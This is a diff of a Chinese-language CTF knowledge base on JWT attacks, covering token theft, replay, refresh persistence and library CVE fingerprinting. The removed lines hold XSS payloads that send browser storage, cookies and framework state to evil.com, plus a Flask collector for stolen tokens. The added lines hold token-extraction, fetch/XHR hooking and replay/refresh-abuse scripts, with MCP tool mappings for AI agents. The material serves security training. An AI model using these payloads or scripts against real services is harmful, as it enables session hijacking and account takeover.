@@ -1891,7 +1891,7 @@ base64url(Header).base64url(Payload).base64url(Signature)
                          XSS / 日志
                          Referer 泄露
                          明文传输
-                         insecure 存储
+                         前端存储
 ```
 
 ## 攻击手法索引
@@ -1906,7 +1906,7 @@ base64url(Header).base64url(Payload).base64url(Signature)
 | 06 | `jwt-claim-missing.md` | Claim 缺失 + 混用 | exp/aud/iss 未验证，ID Token 当 Access Token |
 | 07 | `jwt-theft-replay.md` | 窃取与重放 | XSS/日志/Referer 泄露 + 无状态无法撤销 |
 | 08 | `jwt-cve-library.md` | CVE与依赖库 | 库实现缺陷导致验签绕过 |
-| 09 | `jwt-toolchain-defense.md` | 工具链+对抗 | 攻击套件、标准流程、对抗矩阵 |
+| 09 | `09-toolchain-operations.md` | 工具链+操作 | 攻击套件、路由流程、结果矩阵 |
 
 ## 快速决策树
 
@@ -3686,809 +3686,723 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # JWT 窃取、重放与持久化
 
-## 原理
+JWT 的关键性质是 Bearer：服务端把 token 当作身份材料，默认不证明“谁正在持有”。CTF 里不要只问 token 从哪里来，要同时问三个问题：
 
-JWT 是 Bearer Token — **持有即能用**，服务端不验证持有者身份，也不维护 Token 状态。这意味着一旦 Token 泄露，攻击者在有效期内可无限使用。
-
-```
-┌──────────────────────────────────────────────────────────┐
-│ JWT 泄露途径全景                                          │
-│                                                           │
-│  客户端                                                     │
-│    ├─ XSS → localStorage / sessionStorage / JS 变量      │
-│    ├─ CSRF → cookie（非 SameSite）自动附带                 │
-│    ├─ 浏览器历史记录 → URL 中的 token=                     │
-│    ├─ 浏览器扩展 / 恶意插件                                │
-│                                                           │
-│  网络层                                                   │
-│    ├─ HTTP 明文传输 → 中间人截获                            │
-│    ├─ Referer 头 → 跨域请求泄露完整 URL                    │
-│    ├─ 代理/CDN 日志 → URL 中的 token                      │
-│                                                           │
-│  服务端                                                   │
-│    ├─ 应用日志 → 记录 Authorization header                 │
-│    ├─ 错误报告 → Sentry/日志聚合含完整请求                  │
-│    ├─ 数据库泄露 → Refresh Token 存储                      │
-│                                                           │
-│  移动端                                                   │
-│    ├─ 备份提取 → iTunes/Android Backup                    │
-│    ├─ 反编译 → 硬编码 Token                                │
-│    ├─ 剪贴板 → 复制粘贴的 Token                            │
-│                                                           │
-│  开发运维                                                  │
-│    ├─ Postman 导出 → 团队共享                               │
-│    ├─ CI/CD 环境变量 → 构建日志                            │
-│    ├─ Git 仓库 → 硬编码 Token/Secret                      │
-└──────────────────────────────────────────────────────────┘
-```
-
----
-
-## 1. XSS 窃取 Token
-
-### 存储策略与安全
-
-```javascript
-// ❌ 不安全: localStorage — 对 XSS 完全暴露
-localStorage.setItem('token', jwt);
-// 攻击者 XSS payload:
-// fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
-
-// ❌ 不安全: sessionStorage — 同样对 XSS 暴露
-sessionStorage.setItem('token', jwt);
-
-// ❌ 不安全: 非 HttpOnly Cookie — JS 可读取
-document.cookie = "token=" + jwt + "; path=/";
-// 攻击者: fetch('https://evil.com/steal?c=' + document.cookie)
-
-// ✅ 较安全: HttpOnly + Secure + SameSite Cookie
-// 服务端设置: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
-// JS 无法读取，仅自动附带在同站请求中
-// 但 CSRF 仍需防范
-```
-
-### 伪代码：XSS Token 窃取
-
-```python
-# 攻击者端：接收窃取的 Token
-from flask import Flask, request
-
-app = Flask(__name__)
-stolen_tokens = []
-
-@app.route('/steal')
-def steal():
-    token = request.args.get('t', '') or request.args.get('c', '')
-    stolen_tokens.append({
-        'token': token,
-        'ip': request.remote_addr,
-        'ua': request.headers.get('User-Agent'),
-        'referer': request.headers.get('Referer'),
-        'time': time.time()
-    })
-    return '', 204  # 不引起注意
-
-@app.route('/tokens')
-def list_tokens():
-    return {"count": len(stolen_tokens), "tokens": stolen_tokens}
-```
-
-### XSS Payloads 针对 Token 存储
-
-```javascript
-// 通用: 窃取所有存储
-fetch('//evil.com/s', {method:'POST', body:JSON.stringify({
-  local: {...localStorage},
-  session: {...sessionStorage},
-  cookie: document.cookie
-})})
-
-// 针对常见 JS 框架状态
-// React / Redux
-fetch('//evil.com/s?r=' + JSON.stringify(window.__REDUX_STORE__))
-
-// Vue / Vuex
-fetch('//evil.com/s?v=' + JSON.stringify(window.__VUEX_STORE__))
-
-// Angular
-fetch('//evil.com/s?a=' + angular.element(document.body).injector().get('AuthService').token)
-
-// 通用: Hook fetch/XHR 捕获所有请求
-const origFetch = window.fetch
-window.fetch = function(...args) {
-  fetch('//evil.com/log', {method:'POST', body:JSON.stringify({
-    url: args[0], headers: args[1]?.headers
-  })})
-  return origFetch.apply(this, args)
-}
-```
-
----
-
-## 2. URL Token 泄露
-
-### 漏洞场景
-
-```
-GET /api/callback?token=eyJhbGciOiJIUz...&redirect=/dashboard
-GET /reset-password?token=eyJhbGciOiJIUz...
-GET /verify-email?token=eyJhbGciOiJIUz...
-```
-
-### 泄露途径
-
-```python
-# 1. Referer 头泄露
-# 场景: https://app.com/callback?token=xxx 中有 <img src="https://evil.com/pixel">
-# 请求 evil.com/pixel 时 Referer = https://app.com/callback?token=xxx
-# 攻击者分析 evil.com 的访问日志即可提取 token
-
-# 2. 浏览器历史
-# URL 中的 token 保留在 history API 和地址栏中
-# window.location.href → 包含完整 token
-
-# 3. 服务端日志
-# GET /api/callback?token=xxx HTTP/1.1 → access.log
-# 日志可能被聚合到 ELK/Splunk，权限更低的人也能看到
-
-# 4. CDN / 代理日志
-# CDN 通常记录完整 URL
-```
-
-### 检查手段
-
-```bash
-# 搜索 JS 源码中通过 URL 传递 token 的模式
-grep -rPn "(token|jwt|access_token|id_token|auth)" --include="*.js" .
-
-# 检查是否有 history.replaceState 清洗 URL
-# 如果没有 → 浏览器历史中存在明文 token
-
-# 检查 Referrer-Policy
-curl -I https://target.com | grep -i referrer-policy
-# 期望: Referrer-Policy: strict-origin 或 no-referrer
-# 缺失时 → Referer 泄露风险
-```
-
----
-
-## 3. 明文传输窃取
-
-```bash
-# 检查 HTTPS 强制
-curl -I http://target.com/login   # 是否有 301 → https?
-curl -I http://api.target.com/    # API 是否允许 HTTP?
-
-# 检查 HSTS 头
-curl -I https://target.com | grep -i strict-transport-security
-# 期望: Strict-Transport-Security: max-age=31536000; includeSubDomains
-# 缺失时 → SSLStrip 攻击可能
-
-# 检查 Cookie 的 Secure 标志
-# Set-Cookie: token=xxx; Secure; HttpOnly; SameSite=Strict
-```
-
----
-
-## 4. Token 重放 & 无法撤销
-
-### 伪代码：重放检测
-
-```python
-# 攻击: 用同一个合法 Token（未修改）发起多次请求
-# 如果服务端没有 jti 检查或黑名单机制 → 可无限重放
-
-def test_replay_protection(target_url: str, token: str, count: int = 100):
-    """
-    用同一个 Token 发起大量请求，测试是否有重放检测
-    """
-    results = []
-    for i in range(count):
-        resp = requests.get(target_url,
-            headers={"Authorization": f"Bearer {token}"})
-        results.append(resp.status_code)
-        if resp.status_code in (429, 401, 403):
-            print(f"[i] Rate limited or rejected at request {i}")
-            break
-    return results
-
-def test_logout_revocation(logout_url: str, api_url: str, token: str):
-    """
-    测试登出后 Token 是否仍有效
-    """
-    # 先验证 token 有效
-    resp_before = requests.get(api_url,
-        headers={"Authorization": f"Bearer {token}"})
-    assert resp_before.status_code == 200, "Token invalid before logout"
-
-    # 登出
-    requests.post(logout_url,
-        headers={"Authorization": f"Bearer {token}"})
-
-    # 再测试 token
-    resp_after = requests.get(api_url,
-        headers={"Authorization": f"Bearer {token}"})
-    if resp_after.status_code == 200:
-        print("[!] Token still valid after logout! (no revocation)")
-    else:
-        print("[+] Token revoked successfully")
-```
-
----
-
-## 检测信号
-
-- Token 在 URL query string 中 → 直接可窃取
-- `Set-Cookie` 缺少 `HttpOnly` → JS 可读
-- `Set-Cookie` 缺少 `Secure` → HTTP 可截获
-- `Set-Cookie` 缺少 `SameSite` → CSRF 可触发
-- 缺少 `Referrer-Policy` 头 → 跨域 Referer 泄露
-- 缺少 HSTS → SSLStrip 可能
-- `exp - iat > 86400` (24h) → 泄露窗口过大
-- 登出后 Token 仍能用 → 无撤销机制
-
-## 工具命令
-
-```bash
-# 检查 Cookie 属性
-curl -v https://target.com/api/login -X POST -d '...' 2>&1 | grep -i set-cookie
-
-# 检查安全头
-curl -I https://target.com | grep -iE "(strict-transport|referrer-policy|content-security)"
-
-# 检查 CORS（可能允许跨域读取响应中的 Token）
-curl -H "Origin: https://evil.com" https://target.com/api/me -I | grep -i access-control
-
-# 用 jwt_tool 修改 exp
-python3 jwt_tool.py <token> -I -pc "exp" -pv "$(date -d '+30 days' +%s)"
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| Token 凭证泄露检测 | `http_probe` | HTTP GET 探测 token 泄露端点 |
-| 知识检索 | `kb_router` | 按 token 泄露信号搜索知识库 |
+1. **落点**：token 存在哪里，谁能读到。
+2. **绑定**：token 绑定了哪些上下文，哪些没有绑定。
+3. **持久化**：access 过期、logout、换 IP、换 UA、刷新链轮换后还能不能继续走。
 
 ## 工作流
 
-捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
+```text
+抽 token 落点
+  → 解码 header/claim 并聚类来源
+  → 用同一业务 oracle 建 baseline
+  → 新 session / logout 后 / UA-IP-Origin 变化重放
+  → refresh 复用与并发测试
+  → 按成功样本跳到 claim、弱密钥、CVE 或客户端链
+```
 
+## 输入信号
 
-## Evidence
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `Authorization: Bearer` 出现在 XHR/fetch | hook 请求头和响应体 | token 可复制到新 session 访问同一 API | token 绑定 cookie/device，单独 bearer 被拒 |
+| `access_token/id_token/token` 出现在 URL | 抽 URL、Referer、history、日志 | 第三方资源 Referer 带完整 token | `Referrer-Policy` 只泄露 origin 或 URL 已 replace |
+| localStorage/sessionStorage 有 JWT | 前端状态快照 + XSS/DOM sink 路由 | 读取 token 后可重放业务接口 | token 只用于前端展示，API 另走 cookie |
+| Cookie 中有 JWT | 检查属性和同站触发 | 非 HttpOnly 可读，或 SameSite 缺失可借浏览器附带 | HttpOnly 但接口仍校验 CSRF/Origin |
+| 登出后 access 仍可用 | logout 前后同一 oracle 重放 | logout 后仍返回用户数据/订单/flag | 立即 `401/invalid jti` |
+| refresh token 存在 | 记录轮换、复用、跨设备 | 旧 refresh 可重复换新 access | refresh 一次后旧值失效 |
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+## 0. 路由矩阵
+
+| token 来源 | 优先 oracle | 下一跳 |
+|---|---|---|
+| URL query/fragment | Referer、浏览器 history、日志抽取 | 若是 reset/verify token，转业务状态机 |
+| localStorage/sessionStorage | XSS、postMessage、前端 bundle 状态 | 转 `07-client/admin-bot-xss` |
+| Cookie | SameSite/Origin/CSRF 差分 | 转 `07-client/cors-csrf` |
+| API 响应体 | 登录/刷新/SSO callback 抓包 | 转 `20-oauth-deep` 或 claim 混用 |
+| access log/HAR/Sentry | 正则抽 JWT，按 alg/kid/aud 聚类 | 转 `08-cve-library` 或 `03-weak-key-bruteforce` |
+
+## 1. 落点枚举
+
+先把 token 从 HAR、日志、HTML、JS 状态和 URL 里抽出来，按 `alg/kid/aud/iss/exp` 聚类。不要只保存 token 字符串，必须保留来源字段，否则后面无法判断泄露路径。
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+import re
+from pathlib import Path
+
+JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*")
+
+def b64json(part):
+    part += "=" * (-len(part) % 4)
+    return json.loads(base64.urlsafe_b64decode(part.encode()))
+
+def classify(token):
+    h, p, _ = token.split(".", 2)
+    header, payload = b64json(h), b64json(p)
+    return {
+        "alg": header.get("alg", ""),
+        "kid": header.get("kid", ""),
+        "typ": header.get("typ", ""),
+        "iss": payload.get("iss", ""),
+        "aud": payload.get("aud", ""),
+        "sub": payload.get("sub", ""),
+        "exp": payload.get("exp", ""),
+        "scope": payload.get("scope", payload.get("scp", "")),
+    }
+
+def iter_text(path):
+    raw = Path(path).read_text(encoding="utf-8", errors="ignore")
+    try:
+        obj = json.loads(raw)
+        yield from walk_json(obj)
+    except Exception:
+        for idx, line in enumerate(raw.splitlines(), 1):
+            yield f"line:{idx}", line
+
+def walk_json(obj, prefix="$"):
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            yield from walk_json(v, f"{prefix}.{k}")
+    elif isinstance(obj, list):
+        for i, v in enumerate(obj):
+            yield from walk_json(v, f"{prefix}[{i}]")
+    else:
+        yield prefix, "" if obj is None else str(obj)
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("files", nargs="+")
+    args = ap.parse_args()
+    seen = set()
+    for path in args.files:
+        for source, text in iter_text(path):
+            for m in JWT_RE.finditer(text):
+                token = m.group(0)
+                if token in seen:
+                    continue
+                seen.add(token)
+                try:
+                    meta = classify(token)
+                except Exception as exc:
+                    meta = {"parse_error": str(exc)}
+                print(json.dumps({"file": path, "source": source, "token": token[:32] + "...", **meta}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+成功样本：不同来源抽出的 token 具有同一 `iss/aud/kid`，且能映射到具体登录、callback、日志或 XSS 路径。失败样本：字符串看似 JWT 但 header/payload 解析失败，或只是静态测试 fixture。
+
+## 2. 浏览器运行时捕获
+
+在题目允许控制浏览器时，优先 hook 请求头、响应体和前端存储。目标不是“偷一次 token”，而是确认 token 何时产生、哪里落盘、刷新时如何变化。
+
+```javascript
+(() => {
+  const dump = label => {
+    console.log("[jwt-store]", label, {
+      local: {...localStorage},
+      session: {...sessionStorage},
+      cookie: document.cookie
+    });
+  };
+  dump("initial");
+  const oldFetch = window.fetch;
+  window.fetch = async function(input, init = {}) {
+    const url = String(input && input.url || input);
+    const headers = init.headers || {};
+    console.log("[jwt-fetch:req]", url, headers, init.body || "");
+    const resp = await oldFetch.apply(this, arguments);
+    const clone = resp.clone();
+    clone.text().then(t => {
+      if (/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/.test(t)) {
+        console.log("[jwt-fetch:resp]", url, t.slice(0, 1000));
+      }
+    }).catch(() => {});
+    return resp;
+  };
+  const open = XMLHttpRequest.prototype.open;
+  const send = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function(method, url) {
+    this.__jwt_url = url;
+    this.__jwt_method = method;
+    return open.apply(this, arguments);
+  };
+  XMLHttpRequest.prototype.send = function(body) {
+    console.log("[jwt-xhr:req]", this.__jwt_method, this.__jwt_url, body || "");
+    return send.apply(this, arguments);
+  };
+})();
+```
+
+## 3. 重放 oracle
+
+同一个 token 至少测四组：原 session、新 session、logout 后、改 UA/IP/Origin 后。响应只看 `200/401` 太粗，应该同时记录 body hash、身份字段、权限字段、业务副作用。
+
+```python
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+import requests
+
+def digest(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def hit(url, token, cookie="", ua="ReplayOracle/1.0", origin=""):
+    headers = {"Authorization": f"Bearer {token}", "User-Agent": ua}
+    if cookie:
+        headers["Cookie"] = cookie
+    if origin:
+        headers["Origin"] = origin
+    r = requests.get(url, headers=headers, timeout=10)
+    try:
+        body = r.json()
+    except Exception:
+        body = {"raw": r.text[:300]}
+    return {
+        "status": r.status_code,
+        "hash": digest(r.text),
+        "location": r.headers.get("Location", ""),
+        "user": body.get("user", body.get("sub", "")) if isinstance(body, dict) else "",
+        "role": body.get("role", body.get("scope", "")) if isinstance(body, dict) else "",
+    }
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--token", required=True)
+    ap.add_argument("--cookie", default="")
+    ap.add_argument("--logout-url", default="")
+    args = ap.parse_args()
+    out = {"baseline": hit(args.url, args.token, args.cookie)}
+    if args.logout_url:
+        requests.post(args.logout_url, headers={"Authorization": f"Bearer {args.token}", "Cookie": args.cookie}, timeout=10)
+        out["after_logout"] = hit(args.url, args.token, args.cookie)
+    out["fresh_session"] = hit(args.url, args.token)
+    out["ua_flip"] = hit(args.url, args.token, args.cookie, ua="Mozilla/5.0 ReplayFlip")
+    out["origin_flip"] = hit(args.url, args.token, args.cookie, origin="https://attacker.example")
+    print(json.dumps(out, ensure_ascii=False, indent=2))
+
+if __name__ == "__main__":
+    main()
+```
+
+判定：
+
+| 结果 | 解释 | 下一步 |
+|---|---|---|
+| fresh session 仍成功 | bearer 未绑定 cookie/device | 测跨账号、跨 IP、长时间窗口 |
+| logout 后仍成功 | jti/撤销链缺失 | 测 refresh 轮换与 access 延寿 |
+| UA/IP 改动后失败 | 存在上下文绑定 | 找绑定字段、设备 ID、指纹 cookie |
+| only cookie 成功 | bearer 不是唯一凭据 | 转 CSRF/CORS/Origin 差分 |
+
+## 4. refresh 持久化
+
+| 变体 | 操作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| reuse | 同一 refresh 连续换 access | 每次返回新 access | 第二次 `invalid refresh` |
+| parallel | 并发使用同一 refresh | 多个 access 同时有效 | 只有一个成功，其余失效 |
+| logout reuse | logout 后继续 refresh | 仍返回 access | refresh 被吊销 |
+| cross device | 设备 A refresh 给设备 B | B 可换 access | 绑定 device/session |
+| scope lift | refresh 换出的 access scope 更大 | `scope/role/aud` 扩张 | 与原 access 一致 |
+
+```python
+#!/usr/bin/env python3
+import argparse
+import concurrent.futures
+import json
+import requests
+
+def refresh(url, token):
+    r = requests.post(url, json={"refresh_token": token}, timeout=10)
+    try:
+        body = r.json()
+    except Exception:
+        body = {"raw": r.text[:200]}
+    return {"status": r.status_code, "body": body}
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--refresh", required=True)
+    ap.add_argument("--workers", type=int, default=5)
+    args = ap.parse_args()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
+        results = list(ex.map(lambda _: refresh(args.url, args.refresh), range(args.workers)))
+    print(json.dumps(results, ensure_ascii=False, indent=2))
+
+if __name__ == "__main__":
+    main()
+```
+
+## 5. Evidence
+
+| 项 | 记录内容 |
+|---|---|
+| token 来源 | HAR/log/URL/storage/cookie 字段路径、原始行号、时间点 |
+| 解码信息 | header、claim、`alg/kid/iss/aud/sub/exp/jti/scope` |
+| 重放矩阵 | baseline、fresh session、logout 后、UA/IP/Origin 变化的响应 |
+| 持久化结果 | refresh 复用、并发、logout 后、跨设备的 access 产出 |
+| 成功样本 | 新 session/登出后/跨上下文仍能访问用户数据、订单、后台、flag |
+| 失败样本 | `invalid jti`、`session mismatch`、`device mismatch`、`refresh reused`、同一 body hash 的拒绝 |
+| 下一跳 | 弱密钥转 `03-weak-key-bruteforce`；claim 缺失转 `06-claim-missing`；库指纹转 `08-cve-library` |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| token 路由 | `kb_router` | 按 token leak、JWT replay、refresh reuse 搜索 |
+| HTTP oracle | `http_probe` | 固定请求头/响应 hash，比较重放结果 |
+| 浏览器 hook | `jshook` | 捕获 localStorage、fetch/XHR、URL callback |
 
 
 ---
-## [ctf-website] JWT 依赖库漏洞 (CVE)
-### JWT Library Vulnerabilities (CVE)
+## [ctf-website] JWT 依赖库 CVE 与指纹路由
+### JWT Library CVEs and Fingerprint Routing
 URL: https://ling71671.github.io/open-reverselab/kb/ctf-website/02-auth/jwt/08-cve-library/
 Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/techniques/02-auth/jwt/08-cve-library.md
 
 > >
 
-# JWT 依赖库漏洞 (CVE)
+# JWT 依赖库 CVE 与指纹路由
 
-## 原理
+JWT CVE 的实战入口不是“扫一遍 CVE”，而是：
 
-JWT 安全性高度依赖库实现的正确性。历史上多次出现 JWT 库因验证逻辑缺陷导致签名完全绕过的严重漏洞。了解这些 CVE 有助于在目标环境中快速定位和利用。
-
----
-
-## 高危 CVE 表
-
-| CVE | 库 | 影响版本 | 原理 | CVSS |
-|-----|-----|---------|------|------|
-| CVE-2022-23529 | node-jsonwebtoken | ≤ 8.5.1 | `secretOrPublicKey` 返回值可被强制为 `undefined`，在特定条件下导致 RCE | 9.8 |
-| CVE-2022-23539 | node-jsonwebtoken | ≤ 8.5.1 | 对 `none` 算法的未充分过滤，IP 地址场景下可绕过 | 7.6 |
-| CVE-2022-23540 | node-jsonwebtoken | ≤ 8.5.1 | `secretOrPublicKey` 类型混淆，可控值被当作密钥 | 7.6 |
-| CVE-2022-23541 | node-jsonwebtoken | ≤ 8.5.1 | `jwt.verify()` 吊销信息通过不安全 `toString()` 比较 | 7.5 |
-| CVE-2018-0114 | Cisco 多个 JWT 实现 | — | 完全不验证签名 | 9.1 |
-| CVE-2017-17405 | Ruby net-ldap | < 0.16.1 | 验证逻辑缺陷 | 8.1 |
-| CVE-2015-9235 | python-jwt | — | `alg=none` 被接受 | 9.8 |
-| CVE-2015-2951 | python-jose | — | `alg=none` 被接受 | 7.5 |
-| CVE-2020-28042 | node-jsonwebtoken | — | 算法混淆 | 7.5 |
-| CVE-2016-10555 | python-jwt | — | RS/HS 算法混淆 | 7.5 |
-
----
-
-## 各 CVE 详细分析
-
-### CVE-2022-23529 — node-jsonwebtoken RCE
-
-```javascript
-// 受影响代码逻辑（简化伪代码）
-// secretOrPublicKey 参数可能被污染为 undefined
-
-const jwt = require('jsonwebtoken');
-
-function verifyWithUserInput(token, userInput) {
-    // BUG: 如果 userInput 为特定值，
-    // getSecretOrPublicKey 可能返回 undefined
-    let secret = getSecretOrPublicKey(userInput);
-    // secret === undefined 时，验证逻辑异常
-    jwt.verify(token, secret, { algorithms: ['HS256'] });
-}
+```text
+错误文本 / 响应头 / 依赖清单 / token 行为
+  → 语言与库指纹
+  → 版本或实现分支假设
+  → 最小 payload 变体
+  → 同一业务 oracle 对比
 ```
-
-```python
-# 攻击利用伪代码
-def exploit_cve_2022_23529(token, target_url):
-    """
-    利用思路：
-    1. 构造特殊的 Header/Payload 组合
-    2. 传入特定的 secretOrPublicKey 值（如空对象、null）
-    3. 利用库在处理 undefined 密钥时的缺陷
-    """
-    # 具体利用取决于业务代码如何传递 secret
-    # 常见场景：从 URL 参数或 body 接受 kid，然后查表，
-    # 若查询结果为空则 key=undefined
-    pass
-```
-
-### CVE-2015-9235 — python-jwt alg=none
-
-```python
-# python-jwt 旧版本（伪代码重现漏洞）
-# 库未将 "none" 加入禁止算法列表
-
-# 漏洞代码等价逻辑：
-ALLOWED_ALGORITHMS = ['HS256', 'HS384', 'HS512', 'RS256', 'none']
-#                                                            ^^^^
-# BUG: none 在允许列表中
-
-def verify(token, key):
-    header = decode_header(token)
-    if header['alg'] == 'none':
-        # BUG: 直接返回 payload，不验证签名
-        return token.payload
-
-# 修复后：
-# ALLOWED_ALGORITHMS 移除 'none'
-# 或显式抛出异常
-```
-
-### CVE-2022-23541 — 不安全 toString() 比较
-
-```javascript
-// 漏洞代码逻辑（简化）
-function isTokenRevoked(decoded, callback) {
-    // BUG: 直接比较 toString() 结果
-    // 攻击者可传入一个对象，其 toString() 返回匹配值
-    revokedTokens.forEach(revoked => {
-        if (decoded.jti.toString() === revoked.toString()) {
-            return callback(null, true);
-        }
-    });
-}
-```
-
-```python
-# 攻击: 构造 jti 为一个对象而非字符串
-# Payload: {"jti": {"toString": "bypass_value"}}
-# 这在 JS 中 toString() 返回 "[object Object]"
-# 但如果服务端 revoke 列表也存成对象，可能产生意外匹配
-```
-
----
-
-## 指纹识别
-
-### 从错误信息识别库和版本
-
-```bash
-# 发送无效 Token，观察错误响应
-curl -H "Authorization: Bearer invalid.token.here" https://target.com/api/me
-curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0." https://target.com/api/me
-
-# 常见错误指纹：
-# "secretOrPublicKey must have a value"          → node-jsonwebtoken (Node.js)
-# "Algorithm none is not allowed"                → PyJWT (Python)
-# "The token is not yet valid (nbf)"             → jjwt (Java)
-# "signature is invalid"                         → jose (Go)
-# "Algorithm not allowed"                        → firebase/php-jwt (PHP)
-```
-
-```python
-# 指纹识别脚本
-def fingerprint_jwt_library(target_url: str):
-    """
-    通过发送畸形 Token，从错误信息推断使用的 JWT 库
-    """
-    probes = [
-        ("none_alg", "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0."),
-        ("empty", ""),
-        ("malformed", "abc.def.ghi"),
-        ("no_sig", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0."),
-        ("future_nbf", None),  # 需手动构造
-    ]
-
-    fingerprints = {
-        "secretOrPublicKey": "node-jsonwebtoken",
-        "Algorithm none is not allowed": "PyJWT",
-        "signature is invalid": "golang-jose",
-        "The token is not yet valid": "jjwt (Java)",
-        "Unsupported algorithm": "firebase/php-jwt",
-        "Token not yet active": "jose (Go 3.x)",
-        "AlgorithmNotAllowed": "pyjwt (newer)",
-    }
-
-    for name, token in probes:
-        resp = requests.get(target_url,
-            headers={"Authorization": f"Bearer {token}"})
-        error_text = resp.text.lower()
-
-        for pattern, lib in fingerprints.items():
-            if pattern.lower() in error_text:
-                return lib
-    return "unknown"
-```
-
-### 从 Header 信息推断框架
-
-```bash
-# 检查 HTTP 响应头推断后端框架
-curl -I https://target.com | grep -iE "(server|x-powered-by|x-aspnet|set-cookie)"
-
-# Server: Microsoft-IIS/10.0 → 可能用 .NET System.IdentityModel.Tokens.Jwt
-# X-Powered-By: Express → 可能用 express-jwt / jsonwebtoken
-# Set-Cookie: JSESSIONID → 可能用 jjwt (Java)
-# Server: Werkzeug → 可能用 Flask + PyJWT
-```
-
----
-
-## CVE 利用决策树
-
-```
-拿到 Token 和已知库信息
-  │
-  ├─ Python (PyJWT / python-jose)
-  │   └─ 版本 < 2.0 → CVE-2015-9235 (alg=none)
-  │
-  ├─ Node.js (jsonwebtoken)
-  │   ├─ 版本 ≤ 8.5.1 → CVE-2022-23529/39/40/41
-  │   │   └─ 若业务代码可控 key 来源 → 尝试 CVE-2022-23529
-  │   └─ 所有旧版本 → 算法混淆 (CVE-2020-28042)
-  │
-  ├─ Java (jjwt)
-  │   └─ 旧版本可能允许 alg=none
-  │
-  ├─ Go (golang-jose / jose)
-  │   └─ v2 及之前 → 允许 none
-  │
-  └─ PHP (firebase/php-jwt)
-      └─ < 6.0 → 允许 none
-```
-
-## 工具命令
-
-```bash
-# jwt_tool CVE 扫描
-python3 jwt_tool.py <token> -t https://target.com/api/me -cv "Welcome"
-
-# 检查 node-jsonwebtoken 版本（如果能读 package.json）
-cat package.json | jq '.dependencies["jsonwebtoken"]'
-
-# 检查 Python JWT 库版本
-pip show pyjwt jwt python-jose
-
-# 搜索已知 CVE
-searchsploit jwt jsonwebtoken
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| CVE 知识检索 | `kb_router` | 按 JWT 库 CVE 信号搜索相关技术 |
-| 漏洞验证 | `http_probe` | HTTP GET 探测验证 CVE 影响 |
 
 ## 工作流
 
-捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
-
-
-## Evidence
-
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
-
-
----
-## [ctf-website] JWT 工具链、攻击流程与对抗矩阵
-### JWT Toolchain, Attack Workflow, and Defense Matrix
-URL: https://ling71671.github.io/open-reverselab/kb/ctf-website/02-auth/jwt/09-toolchain-defense/
-Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/techniques/02-auth/jwt/09-toolchain-defense.md
-
-> >
-
-# JWT 工具链、攻击流程与对抗矩阵
-
-## 1. 完整工具链
-
-### 核心工具
-
-| 工具 | 用途 | 安装 |
-|------|------|------|
-| [jwt_tool.py](https://github.com/ticarpi/jwt_tool) | 全能：解码、扫描、伪造、爆破、重放 | `git clone && pip install -r requirements.txt` |
-| [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) | C 语言高速 HS 密钥爆破 | `make` |
-| [hashcat](https://hashcat.net/hashcat/) | GPU 加速 HS 爆破 `-m 16500` | 系统包管理器 |
-| [Burp JWT Editor](https://portswigger.net/bappstore/ae0b7ed2e1d94e51a114b92b74660e4f) | GUI JWT 编辑/重放 | BApp Store |
-| [jwt.io](https://jwt.io/) | 在线调试、解码 | Web |
-| [CyberChef](https://cyberchef.org/) | 本地 Base64/JWT 编解码 | Web / 离线版 |
-
-### 辅助工具
-
-| 工具 | 用途 |
-|------|------|
-| `openssl` | 生成 RSA/EC 密钥对、证书 |
